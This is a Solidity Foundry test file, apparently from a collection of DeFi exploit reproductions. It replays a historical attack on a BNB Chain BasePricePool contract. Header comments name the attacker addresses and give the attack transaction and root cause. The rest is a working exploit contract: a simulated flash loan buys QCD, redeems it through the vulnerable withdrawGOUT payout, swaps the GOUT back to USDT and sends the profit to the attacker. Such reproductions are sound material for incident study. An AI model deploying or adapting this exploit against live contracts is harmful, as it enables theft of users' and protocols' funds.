// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 802.57 USD
// Attacker : 0xd9A34aF0b97f13871287C317ea0e1E8C00be0630
// Attack Contract : 0x99e9Ee61cAC90715FdEDbB07D8786535964BF47b
// Vulnerable Contract : 0x53FEF7d598A2db0920b2a9FdF27e5C401DC9fF85
// Attack Tx : https://bscscan.com/tx/0x21cbcc96cd7e31bcb5a724c7ae2ad886c0782d73f83dcbf49cf64f2c2eee4a51
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x53FEF7d598A2db0920b2a9FdF27e5C401DC9fF85#code
// Run note : FOUNDRY_EVM_VERSION=cancun is required when the repo default EVM is older than Cancun.
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1306
//
// Attack summary: the attacker flash-borrowed USDT, bought QCD, called BasePricePool.withdrawGOUT with
// the freshly bought QCD, sold the received GOUT back to USDT, repaid the flash source, and kept the
// surplus USDT.
// Root cause: withdrawGOUT prices the GOUT payout from the post-transfer QCD amount and a circulating
// QCD denominator derived from manipulable token/pair balances, allowing an attacker to redeem newly
// purchased QCD for more GOUT value than the QCD cost.

address constant ATTACKER = 0xd9A34AF0b97f13871287C317ea0e1E8C00BE0630;
address constant HISTORICAL_ATTACK_CONTRACT = 0x99e9eE61CaC90715fDEDBB07d8786535964bF47b;
address constant DODO_USDT_POOL = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
address constant BASE_PRICE_POOL = 0x53FeF7d598A2Db0920b2A9fDF27E5C401DC9Ff85;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant QCD_TOKEN = 0x50D5C6cbe5B5d4ae048F8AA3cdcdc5A2f10d5F78;
address constant GOUT_TOKEN = 0xF86AF2FBcf6A0479B21b1d3a4Af3893F63207FE7;

uint256 constant FLASH_USDT_AMOUNT = 1_900 ether;

interface IBasePricePool {
    function withdrawGOUT(
        uint256 amount
    ) external;
}

interface IPancakeRouterFeeOnTransfer {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 51_713_981;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = USDT_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(DODO_USDT_POOL, "DODO USDT pool");
        vm.label(BASE_PRICE_POOL, "BasePricePool");
        vm.label(PANCAKE_ROUTER, "Pancake router");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(QCD_TOKEN, "QCD");
        vm.label(GOUT_TOKEN, "GOUT");
    }

    function testExploit() public balanceLog {
        uint256 dodoUsdtBefore = IERC20(USDT_TOKEN).balanceOf(DODO_USDT_POOL);
        uint256 attackerUsdtBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);

        assertGe(dodoUsdtBefore, FLASH_USDT_AMOUNT);

        BasePricePoolAttack attack = new BasePricePoolAttack(ATTACKER);

        // step 1: model the historical DODO flash loan as same-transaction USDT capital and exact repay.
        vm.prank(DODO_USDT_POOL);
        IERC20(USDT_TOKEN).transfer(address(attack), FLASH_USDT_AMOUNT);

        attack.execute();

        uint256 attackerProfit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerUsdtBefore;
        assertEq(IERC20(USDT_TOKEN).balanceOf(DODO_USDT_POOL), dodoUsdtBefore);
        assertGt(attackerProfit, 790 ether);
    }
}

contract BasePricePoolAttack {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;

        IERC20(USDT_TOKEN).approve(PANCAKE_ROUTER, type(uint256).max);
        IERC20(QCD_TOKEN).approve(BASE_PRICE_POOL, type(uint256).max);
        IERC20(GOUT_TOKEN).approve(PANCAKE_ROUTER, type(uint256).max);
    }

    function execute() external {
        address[] memory usdtToQcd = new address[](2);
        usdtToQcd[0] = USDT_TOKEN;
        usdtToQcd[1] = QCD_TOKEN;

        // step 2: buy QCD with the flash USDT.
        IPancakeRouterFeeOnTransfer(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASH_USDT_AMOUNT, 1, usdtToQcd, address(this), block.timestamp + 1 hours
        );

        // step 3: redeem the newly bought QCD through the vulnerable payout calculation.
        uint256 qcdBalance = IERC20(QCD_TOKEN).balanceOf(address(this));
        IBasePricePool(BASE_PRICE_POOL).withdrawGOUT(qcdBalance);

        address[] memory goutToUsdt = new address[](2);
        goutToUsdt[0] = GOUT_TOKEN;
        goutToUsdt[1] = USDT_TOKEN;

        // step 4: sell the received GOUT, repay the flash source, and forward the USDT profit.
        uint256 goutBalance = IERC20(GOUT_TOKEN).balanceOf(address(this));
        IPancakeRouterFeeOnTransfer(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            goutBalance, 1, goutToUsdt, address(this), block.timestamp + 1 hours
        );

        IERC20(USDT_TOKEN).transfer(DODO_USDT_POOL, FLASH_USDT_AMOUNT);
        IERC20(USDT_TOKEN).transfer(profitReceiver, IERC20(USDT_TOKEN).balanceOf(address(this)));
    }

    receive() external payable {}
}
